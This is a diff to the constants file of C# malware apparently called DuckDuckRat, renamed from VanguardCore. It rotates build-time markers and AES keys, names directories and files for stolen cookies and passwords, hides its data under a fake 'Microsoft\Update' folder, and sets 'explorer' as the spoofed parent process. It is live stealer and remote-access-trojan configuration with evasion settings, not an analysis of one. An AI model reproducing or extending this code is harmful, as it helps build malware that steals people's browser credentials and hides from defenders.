@@ -1,6 +1,6 @@
 using System;
 
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public static class Constants
     {
@@ -9,23 +9,23 @@ namespace VanguardCore
         public const bool DEBUG_MODE = false;
 
         // Build-time randomized markers (patched by full_rebuild.ps1)
-        public const string IPC_EVENT_BASE = "EmoCore_Event_553cb4b6";
-        public const string APP_DATA_SUBDIR = "Microsoft\\Update\\ec9179";
+        public const string IPC_EVENT_BASE = "DuckDuckRat_Event_7f766cac";
+        public const string APP_DATA_SUBDIR = "Microsoft\\Update\\cdb076";
         
         // [PRO] IO Randomization
-        public const string STEALER_DIR_NAME = "2117Svc";
-        public const string COOKIE_FILE_NAME = "cache_4705.db";
-        public const string PASSWORD_FILE_NAME = "log_1053.tmp";
-        public const string LOG_FILE_NAME = "err_2873.log";
+        public const string STEALER_DIR_NAME = "2305Svc";
+        public const string COOKIE_FILE_NAME = "cache_9601.db";
+        public const string PASSWORD_FILE_NAME = "log_8289.tmp";
+        public const string LOG_FILE_NAME = "err_9391.log";
         
         // Version info
-        public const string VERSION = "2604.6.53-v1";
+        public const string VERSION = "2604.3.14-v1";
 
         // From defense/Constants:
         // These keys are updated at build time by full_rebuild.ps1
         // AES-GCM Keys (Base64)
-        public const string MASTER_KEY_B64 = "/sUepIO6QwLqMcQKnUtjDMQOXnaH4fm12UTJ8AFx7ls=";
-        public const string ENCRYPTED_SESSION_KEY_B64 = "5+GQZc3hicxJpEuuwTLUjZAUVm+R64vpTGc5AfdEgLU=";
+        public const string MASTER_KEY_B64 = "9K4MotA/uSZOG9U+YNqhc8rJPxgIU9a/nb0qKSm7+f8=";
+        public const string ENCRYPTED_SESSION_KEY_B64 = "4lPOED97k6mGbVrAcbniYOBItmrfhrkoFHKMofDuBzs=";
         
         // Target process name for PPID spoofing
         public const string SPOOF_PARENT = "explorer";
@@ -46,6 +46,25 @@ namespace VanguardCore
         public static readonly string[] CLEAN_REGIONS = { "HK", "SG", "TW", "US", "DE", "FR", "JP", "GB" };
     }
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
